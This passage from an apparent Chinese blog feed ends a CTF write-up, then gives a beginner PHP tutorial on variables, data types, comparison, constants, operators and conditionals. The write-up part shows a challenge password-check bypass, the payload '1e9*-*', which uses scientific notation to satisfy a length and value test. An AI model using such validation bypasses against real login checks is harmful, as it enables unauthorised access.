class="hljs-string">	&#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>对源码进行审计后发现了出题人的小秘密<img src="https://img-blog.csdnimg.cn/20210523202302371.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到要求输入的密码必须<strong>小于八位并且数值大于9999999</strong>并且最后要加上<code>*-*</code><br>根据科学计数法1e9=1000000000&gt; 9999999<br>因此构造<br><strong><code>payload:1e9*-*</code></strong></p>
]]></content>
  </entry>
  <entry>
    <title>PHP入门学习阶段（一）</title>
    <url>/2021/06/05/PHP%E5%85%A5%E9%97%A8%E9%98%B6%E6%AE%B5%E5%AD%A6%E4%B9%A0(%E4%B8%80)/</url>
    <content><![CDATA[<h1 id="一、常量"><a href="#一、常量" class="headerlink" title="一、常量"></a>一、常量</h1><p>PHP 变量规则：</p>
<ul>
<li>变量以 $ 符号开始，后面跟着变量的名称</li>
<li>变量名必须以字母或者下划线字符开始</li>
<li>变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）</li>
<li>变量名不能包含空格</li>
<li>变量名是区分大小写的（<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="3.322ex" height="3.343ex" style="vertical-align: -1.171ex;" viewBox="0 -934.9 1430.4 1439.2" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">y 和 </title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-79" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-79" x="0" y="0"></use>
<g transform="translate(497,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">和</text>
</g>
</g>
</svg>Y 是两个不同的变量）</li>
</ul>
<p>变量是用于存储信息的”容器”：<br><img src="https://img-blog.csdnimg.cn/20210227110903845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>以上x,y,z均属于变量<br><strong>注释：当您赋一个文本值给变量时，请在文本值两侧加上引号。</strong><br><img src="https://img-blog.csdnimg.cn/20210227111418680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>变量的作用分为局部变量以及全局变量</strong><br>变量的作用域是脚本中变量可被引用/使用的部分。</p>
<p>PHP 有四种不同的变量作用域：</p>
<ul>
<li>local</li>
<li>global</li>
<li>static</li>
<li>parameter</li>
</ul>
<p><strong>local</strong><br>是局部变量，仅能在函数内部访问。</p>
<p><img src="https://img-blog.csdnimg.cn/20210227114324961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到，函数内部是可以输出的但对于全局来说是无法访问的<br> <strong>global</strong> </p>
<p>用于函数内访问全局变量。<br>在函数内调用函数外定义的全局变量，我们需要在函数中的变量前加上 global 关键字或者使用 $GLOBALS[index] 数组：<br><img src="https://img-blog.csdnimg.cn/20210227112610201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210227113706999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>Static</strong><br>当一个函数完成时，它的所有变量通常都会被删除。然而，有时候您希望某个局部变量不要被删除。</p>
<p>要做到这一点，请在您第一次声明变量时使用 static 关键字：<br><img src="https://img-blog.csdnimg.cn/20210227113104139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用<code>static</code>保留函数内部的 X值，便于依次运算。</p>
<h1 id="二、数据类型"><a href="#二、数据类型" class="headerlink" title="二、数据类型"></a>二、数据类型</h1><p>PHP中主要又一下几种数据类型：</p>
<ol>
<li>String（字符串）</li>
<li>Integer（整型）</li>
<li>Float（浮点型）</li>
<li>Boolean（布尔型）</li>
<li> Array（数组）</li>
<li>Object（对象）</li>
<li>NULL（空值）</li>
</ol>
<p><strong>一.String</strong><br>一个字符串是一串字符的序列,你可以将任何文本放在单引号和双引号中.<br>上述我们已经讲过：这里再演示一遍<br><img src="https://img-blog.csdnimg.cn/20210227155756330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>二.Integer</strong></p>
<p>整数是一个没有小数的数字。<br>整数规则:</p>
<p>整数必须至少有一个数字 (0-9)<br>整数不能包含逗号或空格<br>整数是没有小数点的<br>整数可以是正数或负数<br>整型可以用三种格式来指定：十进制， 十六进制（ 以 0x 为前缀）或八进制（前缀为 0）。<br><strong>PHP var_dump() 函数返回变量的数据类型和值：</strong><br><img src="https://img-blog.csdnimg.cn/20210227160254563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>三.Float</strong><br>浮点数是带小数部分的数字，或是指数形式。<br><img src="https://img-blog.csdnimg.cn/20210227160611254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>四.布尔型</strong><br>布尔型可以是 TRUE 或 FALSE。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">$x&#x3D;true;<br>$y&#x3D;false;<br></code></pre></td></tr></table></figure>
<p>常用于条件判断</p>
<p><strong>五.数组</strong><br>数组可以在一个变量中存储多个值。<br><img src="https://img-blog.csdnimg.cn/20210227161205618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>六.对象</strong><br>对象数据类型也可以用于存储数据。<br>在 PHP 中，对象必须声明。<br>首先，你必须使用class关键字声明类对象。类是可以包含属性和方法的结构。<br>这个有点不太明白，我用文本实例向大家说明：<br><img src="https://img-blog.csdnimg.cn/20210227161947909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>相比对于新手来说<br><strong>echo，print，print_r，var_dump 的区别</strong>也像我一样疑惑，这里向大家解释一下：<br>1.echo</p>
<p>输出一个或者多个字符串。</p>
<p>2.print</p>
<p>和 echo 最主要的区别： print 仅支持一个参数，并总是返回 1。</p>
<p>3.print_r</p>
<p>打印关于变量的易于理解的信息,如果给出的是 string、integer 或 float，将打印变量值本身。如果给出的是 array，将会按照一定格式显示键和元素。object 与数组类似。 记住，print_r() 将把数组的指针移到最后边。使用 reset() 可让指针回到开始处。</p>
<p>4.var_dump</p>
<p>此函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</p>
<p>5.var_dump 和 print_r 的区别</p>
<p>var_dump 返回表达式的类型与值而 print_r 仅返回结果，相比调试代码使用 var_dump 更便于阅读。</p>
<p><strong>七.NULL 值</strong><br>NULL 值表示变量没有值。NULL 是数据类型为 NULL 的值。</p>
<p>NULL 值指明一个变量是否为空值。 同样可用于数据空值和NULL值的区别。</p>
<p>可以通过设置变量值为 NULL 来清空变量数据：<br><img src="https://img-blog.csdnimg.cn/20210227162408453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到回复值为：NULL即为空值</p>
<h1 id="三-类型比较"><a href="#三-类型比较" class="headerlink" title="三.类型比较"></a>三.类型比较</h1><p>虽然 PHP 是弱类型语言，但也需要明白变量类型及它们的意义，因为我们经常需要对 PHP 变量进行比较，包含松散和严格比较。</p>
<ul>
<li>松散比较：使用两个等号 == 比较，只比较值，不比较类型。</li>
<li>严格比较：用三个等号 === 比较，除了比较值，也比较类型。</li>
</ul>
<p>在这里：<code>42是一个整形数字</code>而<code>“42”</code>是一个字符串<br><img src="https://img-blog.csdnimg.cn/2021022716323948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到结果：说明松散和严格两种结果<br>这里简述一下，如果需要学习更多种类型的比较标准可以去PHP官网进行学习或者去<a href="https://www.runoob.com/php/php-types-comparisons.html">点击这里也可以进行学习</a></p>
<h1 id="四-常量"><a href="#四-常量" class="headerlink" title="四.常量"></a>四.常量</h1><p>常量是一个简单值的标识符。该值在脚本中不能改变。</p>
<p>一个常量由英文字母、下划线、和数字组成,但数字不能作为首字母出现。 **(常量名不需要加 $ 修饰符，不然会报错的！！！)**。</p>
<p><strong>注意： 常量在整个脚本中都可以使用。</strong></p>
<p><strong>设置常量</strong><br>使用 define() 函数，函数语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">bool define ( string <svg xmlns:xlink="http://www.w3.org/1999/xlink" width="13.254ex" height="2.509ex" style="vertical-align: -0.671ex;" viewBox="0 -791.3 5706.7 1080.4" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">name , mixed </title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-6D" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path>
<path stroke-width="1" id="E1-MJMATHI-69" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-78" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path>
<path stroke-width="1" id="E1-MJMATHI-64" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-6E" x="0" y="0"></use>
 <use xlink:href="#E1-MJMATHI-61" x="600" y="0"></use>
 <use xlink:href="#E1-MJMATHI-6D" x="1130" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="2008" y="0"></use>
 <use xlink:href="#E1-MJMAIN-2C" x="2475" y="0"></use>
 <use xlink:href="#E1-MJMATHI-6D" x="2920" y="0"></use>
 <use xlink:href="#E1-MJMATHI-69" x="3798" y="0"></use>
 <use xlink:href="#E1-MJMATHI-78" x="4144" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="4716" y="0"></use>
 <use xlink:href="#E1-MJMATHI-64" x="5183" y="0"></use>
</g>
</svg>value [, bool $case_insensitive &#x3D; false ] )<br></code></pre></td></tr></table></figure>
<p>该函数有三个参数:</p>
<ul>
<li>name：必选参数，常量名称，即标志符。</li>
<li>value：必选参数，常量的值。</li>
<li>case_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。</li>
</ul>
<p>以下我们设置一个区别大小写以及不区别的常量实例进行说明：<br><strong>这是有区别的！</strong><br><img src="https://img-blog.csdnimg.cn/20210227164854725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>额..这里报错是因为大小写是有区别的是两个不同的变量而<code>willian</code>起初是没有被定义的。<br><strong>没有区别</strong><br><img src="https://img-blog.csdnimg.cn/20210227165150638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>是不是多了一个参数</p>
<p>在常量的起初我们已经说过了常量是在全局都可以使用的下面我们来展示一下：<br><img src="https://img-blog.csdnimg.cn/20210227165612255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>大家看即便是定义的函数内部变量但仍可以使用这是因为已经定义过的变量在全局中都可以使用。</p>
<h1 id="五-字符串变量"><a href="#五-字符串变量" class="headerlink" title="五.字符串变量"></a>五.字符串变量</h1><p>字符串变量用于包含有字符的值。</p>
<p>在创建字符串之后，我们就可以对它进行操作了。您可以直接在函数中使用字符串，或者把它存储在变量中。<br>比如呢：<img src="https://img-blog.csdnimg.cn/20210227170136361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>现在，让我们来看看一些常用的操作字符串的函数和运算符。</p>
<p><strong>并置运算符</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">并置运算符 (.) 用于把两个字符串值连接起来。<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210227170507624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里我在两个字符串之间连接了一个空格便于查看，因此使用了两次运算符<br><strong>strpos() 函数</strong><br>trpos() 函数用于在字符串内查找一个字符或一段指定的文本。</p>
<p>如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。<br><img src="https://img-blog.csdnimg.cn/20210227171009611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>提示</strong>：在上面的实例中，字符串 “world” 的位置是 6。之所以是 6 而不是 7 的原因是，字符串中第一个字符的位置是 0，而不是 1。</p>
<p><strong>strlen() 函数</strong><br>strlen() 函数返回字符串的长度（字节数）。</p>
<p><img src="https://img-blog.csdnimg.cn/20210227171230962.png" alt="在这里插入图片描述"><br><a href="https://www.runoob.com/php/php-ref-string.html">这里查看更多字符串函数</a></p>
<h1 id="六-运算符"><a href="#六-运算符" class="headerlink" title="六.运算符"></a>六.运算符</h1><p><strong>算术运算符</strong><br><img src="https://img-blog.csdnimg.cn/2021022717412920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里举例一个特殊的：取反<br><img src="https://img-blog.csdnimg.cn/20210227174309298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>赋值运算符</strong><br><img src="https://img-blog.csdnimg.cn/20210227174352747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">$x&#x3D;10;<br>echo $x;<br>echo &quot;&lt;br&gt;&quot;;<br><br>$y&#x3D;20;<br>$y+&#x3D;200;<br>echo $y;<br>echo &quot;&lt;br&gt;&quot;; 加法<br><br>$z&#x3D;50;<br>$z-&#x3D;25;<br>echo $z;<br>echo &quot;&lt;br&gt;&quot;;减法<br><br>$i&#x3D;5;<br>$i*&#x3D;6;<br>echo $i;<br>echo &quot;&lt;br&gt;&quot;;乘法<br><br>$j&#x3D;10;<br>$j&#x2F;&#x3D;5;<br>echo $j;<br>echo &quot;&lt;br&gt;&quot;;除法<br><br>$k&#x3D;15;<br>$k%&#x3D;4;<br>echo $k;求余<br><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210227174927208.png" alt="在这里插入图片描述"></p>
<p> <strong>递增/递减运算符</strong><br>  <img src="https://img-blog.csdnimg.cn/20210227175053881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210227175358399.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>比较运算符</strong><br><img src="https://img-blog.csdnimg.cn/20210227175433174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>举例说明：<img src="https://img-blog.csdnimg.cn/20210227175829495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p> <strong>逻辑运算符</strong><br> <img src="https://img-blog.csdnimg.cn/20210227175910314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>数组运算符</strong><br><img src="https://img-blog.csdnimg.cn/20210227180036902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210227180444830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="七-If…Else-语句"><a href="#七-If…Else-语句" class="headerlink" title="七.If…Else 语句"></a>七.If…Else 语句</h1><p>在 PHP 中，提供了下列条件语句：</p>
<ul>
<li>if 语句 - 在条件成立时执行代码</li>
<li>if…else 语句 - 在条件成立时执行一块代码，条件不成立时执行另一块代码</li>
<li>if…elseif….else 语句 - 在若干条件之一成立时执行一个代码块</li>
<li>switch 语句 - 在若干条件之一成立时执行一个代码块</li>
</ul>
<p> <strong>if 语句</strong><br> if 语句用于仅当指定条件成立时执行代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">if (条件)<br>&#123;<br>    条件成立时要执行的代码;<br>&#125;<br></code></pre></td></tr></table></figure>
<p> <img src="https://img-blog.csdnimg.cn/20210227181215905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>if…else 语句</strong><br>在条件成立时执行一块代码，条件不成立时执行另一块代码，请使用 if….else 语句。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">if (条件)<br>&#123;<br>条件成立时执行的代码;<br>&#125;<br>else<br>&#123;<br>条件不成立时执行的代码;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>如果t小于20则输出第一句否则输出第二句<br><img src="https://img-blog.csdnimg.cn/20210227181402236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> <strong>if…elseif….else 语句</strong><br> 在若干条件之一成立时执行一个代码块，请使用 if….elseif…else 语句。.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">if (条件)<br>&#123;<br>    if 条件成立时执行的代码;<br>&#125;<br>elseif (条件)<br>&#123;<br>    elseif 条件成立时执行的代码;<br>&#125;<br>else<br>&#123;<br>    条件不成立时执行的代码;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>如果时间小于10则输出第一句如果时间大于10且小于20则输出第二局，否则时间大于20则输出第三局<br><img src="https://img-blog.csdnimg.cn/20210227181908972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Switch 语句</strong><br>如果您希望有选择地执行若干代码块之一，请使用 switch 语句。</p>
